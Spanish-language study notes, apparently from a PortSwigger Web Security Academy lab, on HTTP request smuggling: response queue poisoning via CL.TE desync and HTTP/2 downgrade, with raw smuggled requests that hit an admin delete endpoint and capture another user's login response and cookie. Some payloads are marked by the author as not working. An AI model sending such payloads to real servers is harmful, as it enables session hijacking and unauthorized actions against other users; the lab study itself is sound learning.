El response queue poisoning es una técnica con la que conseguimos  que a los usuarios se les muestre continuadamente respuesta a peticiones que no han solicitado.

Front-end (CL) -> El frontend pilla todo como una única request

```HTTP
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 120
Transfer-Encoding: chunked

0

POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 25

x=GET / HTTP/1.1
Host: vulnerable-website.com
```

**Back-end (TE)** -> `ulnerable-website.com` quedaría como la tercera request, se cerraría la conexión , porque hay un error, es algo que no queremos

```HTTP
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 120
Transfer-Encoding: chunked

0

POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 25

x=GET / HTTP/1.1
Host: vulnerable-website.com
```

Front-end (CL)

```HTTP
POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Content-Type: x-www-form-urlencoded\r\n
Content-Length: 61\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /anything HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
GET / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
Back-end (TE)
```

**Back-end (TE)** -> Así si que se interpretarían 3 request y la conexión no se cerraría

```HTTP
POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Content-Type: x-www-form-urlencoded\r\n
Content-Length: 61\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /anything HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
GET / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
```

Usando esta técnica lo que podemos hacer es robar respuestas a request de otros usuarios :

![[Pasted image 20250425100601.png]]

___

La cosa aquí es que HTTP/2 separa en frames las conexiones y les asigna un length, por lo que no se puede explotar HTTP request smuggling, la única forma de hacerlo es con un downgrade.

El frontend no va a saber interpretar Transfer-Encoding: chunked y medirá el tamaño a su manera con la técnica de frames de HTTP/2, al contrario que el backend.


Esto no va por alguna razón : 
```HTTP
POST / HTTP/2/r/n
Host: 0a110030048b36a1809f5db200b70006.web-security-academy.net/r/n
Cookie: session=DUwrPVDlkpgrXfoWUjvJGMDeMASnQgsD/r/n
Content-Type: application/x-www-form-urlencoded/r/n
Transfer-Encoding: chunked/r/n
/r/n
0/r/n
/r/n
GET /admin/delete?username=carlos HTTP/1.1/r/n
Host: 0a110030048b36a1809f5db200b70006.web-security-academy.net/r/n
X-Ignore: X
```

Ni esto  :

```HTTP
POST / HTTP/2/r/n
Host: 0a110030048b36a1809f5db200b70006.web-security-academy.net/r/n
Cookie: session=DUwrPVDlkpgrXfoWUjvJGMDeMASnQgsD/r/n
Content-Type: application/x-www-form-urlencoded/r/n
Transfer-Encoding: chunked/r/n
/r/n
0/r/n
/r/n
GET /admin/delete?username=carlos HTTP/1.1/r/n
X-Ignore: X
```

Hay que tener en cuenta que el admin está haciendo una petición de inicio de sesión POST que nos devolverá una cookie con un Set-Cookie con un 302 : 

```HTTP
POST /login HTTP/1.1
Host: tu-lab...
...
```

Entonces no tendría sentido cambiar la request del admin, porque no esta logueado y tiraría un 401 para el :

```HTTP
GET /admin/delete?username=carlos HTTP/1.1/r/n
X-Ignore: XPOST /login HTTP/1.1
Host: tu-lab...
...
```

Lo mejor es ir alternando 2 404 hasta que uno de ellos responda con ese 302 que se ha colado por enmedio : 

```HTTP
POST /404 HTTP/2/r/n
Host: 0a110030048b36a1809f5db200b70006.web-security-academy.net/r/n
Cookie: session=DUwrPVDlkpgrXfoWUjvJGMDeMASnQgsD/r/n
Content-Type: application/x-www-form-urlencoded/r/n
Transfer-Encoding: chunked/r/n
/r/n
0/r/n
/r/n
GET /404 HTTP/1.1/r/n
Host: 0a110030048b36a1809f5db200b70006.web-security-academy.net/r/n
/r/n
```

Lo metemos al intruder y esperamos un buen rato hasta que salga el 302